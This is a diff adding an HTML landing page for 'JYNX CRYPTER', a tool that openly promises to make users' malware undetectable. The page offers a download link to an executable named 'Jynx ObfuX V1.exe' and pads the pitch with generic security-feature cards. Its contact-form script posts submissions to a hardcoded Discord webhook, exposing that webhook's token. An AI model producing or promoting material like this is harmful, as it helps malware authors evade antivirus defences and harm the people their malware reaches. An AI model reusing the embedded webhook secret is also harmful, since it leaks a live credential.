@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JYNX CRYPTER - Malware Protection</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<style>
+* { box-sizing:border-box; margin:0; padding:0; font-family:"Poppins",sans-serif; }
+body { display:flex; flex-direction:column; min-height:100vh; color:white; overflow-x:hidden; background:#000; }
+
+canvas#bg { position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; }
+
+/* Sidebar */
+.sidebar { position:fixed; top:0; right:0; width:220px; height:100%; background:rgba(0,0,0,0.85); padding-top:2rem; display:flex; flex-direction:column; align-items:center; }
+.sidebar h2 { color:#fff; margin-bottom:2rem; }
+.sidebar a { display:block; color:white; padding:1rem 0; width:100%; text-align:center; margin-bottom:0.5rem; font-weight:bold; border-radius:8px; transition:0.3s; }
+.sidebar a:hover { background:#fff; color:#000; }
+
+/* Main */
+.main { margin-right:220px; padding:2rem; flex:1; }
+
+/* Hero */
+.hero { text-align:center; padding:5rem 2rem; }
+.hero h1 { font-size:2.5rem; color:#fff; margin-bottom:1rem; text-shadow:0 0 10px #fff; }
+.hero p { font-size:1.2rem; margin-bottom:2rem; max-width:700px; margin:auto; color:#ddd; text-shadow:0 0 5px #000; }
+.btn { padding:0.8rem 2rem; background:#000; color:#fff; font-weight:bold; border-radius:10px; transition:0.3s; display:inline-block; margin:0.5rem; text-decoration:none; border:2px solid #fff; }
+.btn:hover { background:#fff; color:#000; }
+
+/* Features */
+.features { display:flex; flex-wrap:wrap; justify-content:center; gap:2rem; margin-top:3rem; }
+.feature { background:rgba(0,0,0,0.8); width:250px; padding:2rem; border-radius:15px; text-align:center; box-shadow:0 4px 20px rgba(0,0,0,0.5); transition:0.3s; }
+.feature:hover { transform:translateY(-5px) scale(1.05); box-shadow:0 8px 30px rgba(255,255,255,0.2); }
+.feature i { font-size:2rem; color:#fff; margin-bottom:1rem; }
+.feature h3 { margin-bottom:0.8rem; color:#fff; }
+.feature p { font-size:1rem; color:#ddd; }
+
+/* Contact Form */
+.container { background:rgba(0,0,0,0.85); padding:2rem 3rem; border-radius:15px; box-shadow:0 8px 20px rgba(255,255,255,0.1); width:90%; max-width:500px; margin:2rem auto; }
+input, textarea { width:100%; padding:0.8rem; margin-bottom:1rem; border-radius:8px; border:1px solid #fff; background:#000; color:#fff; font-size:1rem; }
+textarea { resize:none; height:120px; }
+button { width:100%; padding:0.8rem; background:#000; color:#fff; font-weight:bold; border-radius:10px; cursor:pointer; transition:0.3s; border:2px solid #fff; font-size:1rem; }
+button:hover { background:#fff; color:#000; }
+.success { color:#fff; text-align:center; margin-top:1rem; }
+.error { color:#ff4d4d; text-align:center; margin-top:1rem; }
+
+/* Footer */
+footer { background:rgba(0,0,0,0.85); text-align:center; padding:2rem; margin-top:2rem; border-top-left-radius:30px; border-top-right-radius:30px; color:white; }
+
+@media(max-width:768px){
+  .sidebar { position:relative; width:100%; height:auto; flex-direction:row; justify-content:space-around; padding:1rem 0; }
+  .main { margin-right:0; }
+  .features { flex-direction:column; align-items:center; }
+}
+</style>
+</head>
+<body>
+
+<canvas id="bg"></canvas>
+
+<!-- Sidebar -->
+<div class="sidebar">
+  <h2>JYNX CRYPTER</h2>
+  <a href="#home">Home</a>
+  <a href="#features">Features</a>
+  <a href="#contact">Contact</a>
+</div>
+
+<!-- Main -->
+<div class="main" id="home">
+  <section class="hero">
+    <h1>Advanced digital encryption tools</h1>
+    <p>The JYNX CRYPTER platform helps protect and secure your malware (Undetectable) using modern and easy-to-use encryption tools.</p>
+    <div>
+      <a href="https://www.mediafire.com/file/xleqcznn08r3w66/Jynx+ObfuX+V1.exe/file" target="_blank" class="btn">Download Jynx ObfuX V1</a>
+    </div>
+  </section>
+
+  <section class="features" id="features">
+    <div class="feature">
+      <i class="fas fa-shield-alt"></i>
+      <h3>Vulnerability Analysis</h3>
+      <p>Detect all security vulnerabilities and provide fast, effective solutions.</p>
+    </div>
+    <div class="feature">
+      <i class="fas fa-lock"></i>
+      <h3>Data Protection</h3>
+      <p>Encrypt and secure all your data to ensure complete privacy.</p>
+    </div>
+    <div class="feature">
+      <i class="fas fa-sync-alt"></i>
+      <h3>Continuous Updates</h3>
+      <p>Regular updates for the latest threats and modern protection techniques.</p>
+    </div>
+    <div class="feature">
+      <i class="fas fa-users"></i>
+      <h3>Community Support</h3>
+      <p>A collaborative platform allowing experts to assist users in real time.</p>
+    </div>
+  </section>
+
+  <div class="container" id="contact">
+    <h2>Contact Us</h2>
+    <form id="contactForm">
+      <input type="text" id="name" placeholder="Full Name" required>
+      <input type="email" id="email" placeholder="Email" required>
+      <textarea id="message" placeholder="Write your message here..." required></textarea>
+      <button type="submit">Send</button>
+      <div id="status"></div>
+    </form>
+  </div>
+</div>
+
+<footer>
+  © 2025 JYNX CRYPTER — All rights reserved
+</footer>
+
+<script>
+// Contact Form Discord Webhook with timestamp
+const webhookURL = "https://discord.com/api/webhooks/1436835032332505151/t7YBhDHoTGWMnSjwhlodtYoTtHfkYVHaSqfh6TXlwbc9jPM_2GxIXMNAqXpFrlEURj_8";
+const contactForm = document.getElementById("contactForm");
+const statusDiv = document.getElementById("status");
+
+contactForm.addEventListener("submit", async (e) => {
+  e.preventDefault();
+  const name = document.getElementById("name").value.trim();
+  const email = document.getElementById("email").value.trim();
+  const message = document.getElementById("message").value.trim();
+  if(!name || !email || !message) return;
+  const now = new Date();
+  const payload = {
+    content: `
+**New message from JYNX CRYPTER**
+**Name:** ${name}
+**Email:** ${email}
+**Message:** ${message}
+**Time:** ${now.toLocaleString()}
+`
+  };
+  try{
+    const res = await fetch(webhookURL,{
+      method:"POST",
+      headers:{ "Content-Type":"application/json" },
+      body: JSON.stringify(payload)
+    });
+    if(res.ok){ statusDiv.innerHTML='<p class="success">Your message has been sent successfully! ✅</p>'; contactForm.reset(); }
+    else { statusDiv.innerHTML='<p class="error">Error sending message. Please try again.</p>'; }
+  }catch(err){ statusDiv.innerHTML='<p class="error">Unable to connect to webhook.</p>'; console.error(err); }
+});
+
+// Animated white-on-black background
+const canvas = document.getElementById("bg");
+const ctx = canvas.getContext("2d");
+let width = canvas.width = window.innerWidth;
+let height = canvas.height = window.innerHeight;
+let lines = [];
+for(let i=0;i<120;i++){
+  lines.push({ x: Math.random()*width, y: Math.random()*height, vx:(Math.random()-0.5)*1.2, vy:(Math.random()-0.5)*1.2, l: Math.random()*2+1 });
+}
+function animate(){
+  ctx.fillStyle = "rgba(0,0,0,0.1)";
+  ctx.fillRect(0,0,width,height);
+  ctx.strokeStyle="#fff";
+  ctx.lineWidth=1;
+  lines.forEach(line=>{
+    ctx.beginPath();
+    ctx.moveTo(line.x,line.y);
+    line.x += line.vx;
+    line.y += line.vy;
+    if(line.x>width) line.x=0; if(line.x<0) line.x=width;
+    if(line.y>height) line.y=0; if(line.y<0) line.y=height;
+    ctx.lineTo(line.x,line.y);
+    ctx.stroke();
+  });
+  requestAnimationFrame(animate);
+}
+animate();
+window.addEventListener("resize",()=>{ width=canvas.width=window.innerWidth; height=canvas.height=window.innerHeight; });
+</script>
+
+</body>
+</html>
